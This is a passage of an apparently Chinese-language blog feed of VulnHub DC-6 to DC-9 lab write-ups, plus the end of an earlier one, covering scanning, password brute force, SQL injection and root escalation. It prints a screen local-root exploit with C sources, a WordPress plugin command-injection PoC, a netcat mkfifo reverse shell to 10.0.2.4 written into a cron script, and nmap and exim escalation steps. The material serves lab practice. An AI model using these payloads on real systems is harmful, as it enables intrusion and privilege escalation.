/etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br></pre></td></tr></table></figure>
<p>创建下面两个文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax.c 文件内容：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rootshell.c 文件内容：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将两个文件编译，名字不能错！！！ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. gcc -fPIC -shared -ldl -o libhax.so libhax.c </span><br><span class="line">2. gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure></p>
<p>将编译完的文件传到靶机，直接执行 41154.sh
即可（有的writeup将41154.sh只保留最后的一部分，我尝试之后不行）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513112647.png" /></p>
<p>最后读取/root/thisistheflag.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">888b    888 d8b                                                      888      888 888 888 </span><br><span class="line">8888b   888 Y8P                                                      888      888 888 888 </span><br><span class="line">88888b  888                                                          888      888 888 888 </span><br><span class="line">888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 </span><br><span class="line">888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888 </span><br><span class="line">888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P </span><br><span class="line">888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;  </span><br><span class="line">888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888 </span><br><span class="line">                                                                                          </span><br><span class="line">                                                                                          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Once again, a big thanks to all those who do these little challenges,</span><br><span class="line">and especially all those who give me feedback - again, it&#x27;s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度适中，entry point确实比较难找。涉及以下攻击方法：</p>
<ol type="1">
<li>文件包含</li>
<li>包含日志</li>
<li>suid提权</li>
<li>exp代码修改</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>文件包含</tag>
        <tag>suid提权</tag>
        <tag>exp代码修改</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-6 Writeup</title>
    <url>/2022/05/13/DC-6%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度适中。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-6,315/">DC: 6 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>提示：</p>
<ul>
<li><code>cat rockyou.txt | grep k01 &gt; passwords.txt</code></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.41</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.41</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513141147.png" /></p>
<h2 id="信息收集">2.2. 信息收集</h2>
<p>根据扫描结果，需要将wordy加入/etc/hosts然后直接访问，主页面除了知道CMS是wordpress之外，没有任何信息。</p>
<p>解析来进行路径扫描，得到一个后台登录界面
/wp-admin，除此之外，没有任何收获。解析来枚举以下用户信息：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate u </span><br></pre></td></tr></table></figure></p>
<p>得到如下用户信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">sarah</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">jens</span><br></pre></td></tr></table></figure></p>
<p>最开始用小的字典爆破，结果没有任何结果，但是使用rockyou.txt又太大了。官网其实给了相关提示，
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat rockyou.txt | grep k01 &gt; passwords.txt # 官网提示</span><br><span class="line">wpscan --url http://wordy/ -U users.txt -P passwords.txt</span><br></pre></td></tr></table></figure></p>
<p>最后得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mark / helpdesk01</span><br></pre></td></tr></table></figure></p>
<p>进入后台，发现了这么一个东西，像是一个插件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513163453.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513163517.png" /></p>
<p>存在 RCE 漏洞。但是这里不要使用给的py文件，虽然可以直接get
shell，但是后续操作的命令中一旦含有空格就会自动断开。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>查看 45274.html，看一下利用方式 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;  </span><br></pre></td></tr></table></figure></p>
<p>阅读之后，发现漏洞其实是在下图红框中</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513163731.png" /></p>
<p>但是，这里被限制了输入长度，因此先随便输入之后，点击 Lookup
并抓包，然后通过修改数据包来get shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513164652.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513164746.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>首先查看了
/etc/passwd，除了root之外还有四个用户：graham,mark,jens,sarah。</p>
<p>一一查看家目录，当查看到 mark 的时候，有一个stuff目录，里面有一个文件
things-to-do.txt，内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah&#x27;s farewell party</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah&#x27;s replacement</span><br></pre></td></tr></table></figure></p>
<p>注意到，graham - GSo7isUM1D4
，后面的字符串可能是密码，尝试切换用户。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165030.png" /></p>
<p>拿到graham权限之后，查看 sudo -l</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165107.png" /></p>
<p>查看该文件的权限</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165133.png" /></p>
<p>文件的内容就两句话，看过去并没有用 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">tar -czf backups.tar.gz /var/www/html</span><br></pre></td></tr></table></figure></p>
<p><strong>但是，注意该文件的所有组是devs，而graham的所有组除了本身之外，还属于devs，意味着graham对该文件有写权限</strong>，因此
<code>echo "bash -i" &gt;&gt; /home/jens/backups.sh</code>，然后执行该文件：(注意指定用户)
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165435.png" /></p>
<p>成功获得 jens 的权限。再次查看 sudo -l</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165503.png" /></p>
<p>根据<a href="https://gtfobins.github.io/gtfobins/nmap/">nmap |
GTFOBins</a>指出，可以依次执行下面命令进行提权： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. TF=$(mktemp) # 创建临时文件</span><br><span class="line">2. echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">3. sudo /usr/bin/nmap --script=$TF</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513170200.png" /></p>
<p>最后，读取/root/theflag.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度适中，除了密码爆破之外，虽然说没有提示也能爆破出来，但是估计要大半天。。。</p>
<p>涉及到的攻击方法：</p>
<ol type="1">
<li>wordpress插件漏洞利用</li>
<li>sudo提权</li>
<li>nmap提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>密码爆破</tag>
        <tag>nmap提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-7 Writeup</title>
    <url>/2022/05/13/DC-7%20Writeup/</url>
    <content><![CDATA[<p>我个人感觉该靶机很难。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-7,356/">DC: 7 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中 -&gt; 高</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.43</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.43</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513192654.png" /></p>
<p>收集的信息：</p>
<ol type="1">
<li>22端口为ssh</li>
<li>80端口为http</li>
<li>CMS为Drupal 8</li>
<li>存在robots.txt</li>
</ol>
<h2 id="信息收集-get-shell">2.2. 信息收集 + get shell</h2>
<p>主页面提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DC-7 introduces some &quot;new&quot; concepts, but I&#x27;ll leave you to figure out what they are.  :-)</span><br><span class="line"></span><br><span class="line">While this challenge isn&#x27;t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won&#x27;t succeed.</span><br><span class="line"></span><br><span class="line">What you will have to do, is to think &quot;outside&quot; the box.</span><br><span class="line"></span><br><span class="line">Way &quot;outside&quot; the box.  :-)</span><br></pre></td></tr></table></figure></p>
<p>又经过了路径扫描，弱口令尝试等都一无所获，除了下面的版本信息。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513194239.png" /></p>
<p>走投无路的时候注意到左下角</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513213715.png" /></p>
<p>通过搜索，找到对应的github，查看config.php，得到下面的信息，尝试后台登陆，发现失败了，尝试ssh登录，成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$servername = &quot;localhost&quot;;</span><br><span class="line">	$username = &quot;dc7user&quot;;</span><br><span class="line">	$password = &quot;MdR3xOgB7#dW&quot;;</span><br><span class="line">	$dbname = &quot;Staff&quot;;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513213956.png" /></p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>查看家目录下的mbox，发现了一个文件
/opt/scripts/backups.sh，权限如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513214109.png" /></p>
<p>内容如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>大致意思就是：先是将/var/www/html目录下的文件备份为/home/dc7user/backups/website.sql，然后再压缩为/home/dc7user/backups/website.tar.gz；接着生成两个加密的文件；然后修改/home/dc7user/baskups目录下的所有文件的权限；最后删除文件。</p>
<p>内容其实没什么用，但是mbox中的信息很耐人寻味，出现了cron，并且该文件也执行了许多次，猜测可能是root的一个定时任务。那么接下来的思路就是往backups.sh文件内写入反弹shell的命令，然后等待着被root执行。</p>
<p>问题来了，该文件只有root和www-data可以写，前者是我们的目标，因此，我们需要先切换到www-data</p>
<h3 id="get-www-data">2.3.1. get www-data</h3>
<p>（这部分不太懂，看大佬的writeup的）</p>
<p>漏洞利用点：</p>
<ul>
<li>PHP模块地址：https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</li>
<li>PHP模块漏洞：<a href="https://www.drupal.org/project/php">PHP |
Drupal.org</a></li>
</ul>
<p>首先利用下面的命令修改admin的密码： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. cd /var/www/html</span><br><span class="line">2. drush user-password admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure></p>
<p>然后后台登陆</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513214743.png" /></p>
<p>接着点击 Extend -&gt; Install new module</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215129.png" /></p>
<p>添加PHP模块，然后install</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215155.png" /></p>
<p>然后回到 Extend，将下面模块勾选，然后点击最后的 Install</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215251.png" /></p>
<p>到这为止，准备工作ok，接着 Content -&gt; Add contetn -&gt; Basic
page</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215336.png" /></p>
<p><strong>在里面写入反弹shell的代码，最后将 Text format 改为 PHP
code，最后点击 Preview</strong>。在这之前需要监听本地对应端口</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215446.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215538.png" /></p>
<p>成功得到 www-data 权限。</p>
<h3 id="get-root">2.3.2. get root</h3>
<p>接着，执行下面的命令，将反弹shell的命令写入backups.sh，注意端口！！！
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure></p>
<p>然后kali开启本地监听，需要等待大概3-5分钟，就会反弹shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215655.png" /></p>
<p>最后，读取/root/theflag.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and all those who have taken the time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">I&#x27;m sending out an especially big thanks to:</span><br><span class="line"></span><br><span class="line">@4nqr34z</span><br><span class="line">@D4mianWayne</span><br><span class="line">@0xmzfr</span><br><span class="line">@theart42</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机我个人感觉很难，第一是因为drupal没了解过，不知道drush以及相关的漏洞；第二就是get
shell感觉思路确实挺 outside the box 的。</p>
<p>涉及的攻击方法如下：</p>
<ol type="1">
<li><strong>信息收集</strong></li>
<li>crontab提权</li>
<li>drupal的PHP模块漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>crontab提权</tag>
        <tag>drupal漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-8 Writeup</title>
    <url>/2022/05/14/DC-8%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度适中。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-8,367/">DC: 8 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.44</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.44</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514143441.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>通过点击右侧的 Detail
中的信息（后三个是我后来测试功能点添加的，原先没有），网页没有任何变化，但是url出现了变化</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514143534.png" /></p>
<p>经过测试，发现存在SQL注入，并且是数字型，有回显</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514143643.png" /></p>
<p>直接丢到sqlmap中，爆破得到下面信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin : $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span><br><span class="line">john  : $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>
<p>将密码丢入 john 中破解，之破解了 john 的密码为 turtle。</p>
<p>利用该密码成功登录后台（通过路径扫描得到后台登录信息）</p>
<h1 id="get-shell">3. get shell</h1>
<p>没有常见的模板、主题、插件等提权点，并且文件上传也无法成功。就开始每个功能点测试，直到发现这么一个地方，很可疑</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144023.png" /></p>
<p>经过测试发现，当我们在contact us 页面提交东西的时候，就会执行这里的
confirmation message</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144137.png" /></p>
<p>如果这里是一段php反弹shell的代码，然后我们再次提交一次 contact
us，按道理来说就会执行这段php代码，然后get shell。</p>
<p>说干就干，先从kali上拿到php反弹shell的代码，然后复制进去（不知道为什么，需要在第一行添加一行内容才可以）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144356.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144334.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<p>再信息收集到suid文件的时候，发现了一个奇怪的文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144618.png" /></p>
<p>搜索exim4的可利用漏洞</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144824.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144749.png" /></p>
<p>查看 46996.sh 的内容，发现有两种利用方式 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Usage (setuid method): ./raptor_exim_wiz -m setuid</span><br><span class="line">2. Usage (netcat method): ./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure></p>
<p>经尝试，第一种方法失败，第二种成功</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514145452.png" /></p>
<p>最后，读取/root/flag.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Brilliant - you have succeeded!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888</span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888</span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888</span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888</span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888</span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;</span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and all those who have taken the time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">I&#x27;m also sending out an especially big thanks to:</span><br><span class="line"></span><br><span class="line">@4nqr34z</span><br><span class="line">@D4mianWayne</span><br><span class="line">@0xmzfr</span><br><span class="line">@theart42</span><br><span class="line"></span><br><span class="line">This challenge was largely based on two things:</span><br><span class="line"></span><br><span class="line">1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</span><br><span class="line">2. A suggestion from @theart42</span><br><span class="line"></span><br><span class="line">The answer to that question is...</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机难度适中，涉及以下攻击方法：</p>
<ol type="1">
<li>drupal后台get shell</li>
<li>SQL注入</li>
<li>suid提权——exim漏洞</li>
</ol>
<p>唯一的难点在于get shell的点比较难找。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>drupal后台get shell</tag>
        <tag>suid提权——exim漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-9 Writeup</title>
    <url>/2022/05/14/DC-9%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>前置知识：</p>
<ul>
<li>端口敲门 (Port Knocking)</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.45</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.45</span><br></pre></td></tr></table></figure>
<p><img
